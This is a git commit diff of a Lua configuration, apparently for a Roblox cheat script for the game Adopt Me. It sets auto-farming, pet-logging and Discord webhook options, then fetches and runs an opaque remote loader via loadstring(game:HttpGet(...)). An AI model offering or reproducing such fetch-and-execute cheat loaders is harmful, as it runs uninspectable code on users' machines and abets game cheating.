c6bf56f819ade7960510dcc925a77b93901804a2
greg66n <darien95sm@hotmail.com>
2025-01-13 10:44:26 -0800

    Update adopt.lua

--- adopt.lua
+++ adopt.lua
@@ -8,7 +8,7 @@ getgenv().Config = {
     ["EggFarmActive"] = false,
     ["Blur_username"] = true,
     ["Blazing_Lion_Log"] = false,
-    ["DiscordId"] = "123456",
+    ["DiscordId"] = "942321951010086922",
     ["Webhook"] = "https://discord.com/api/webhooks/123456",
 }
 loadstring(game:HttpGet("https://api.luarmor.net/files/v3/loaders/66567bfd337b57eb059b58dbe1badb89.lua"))()
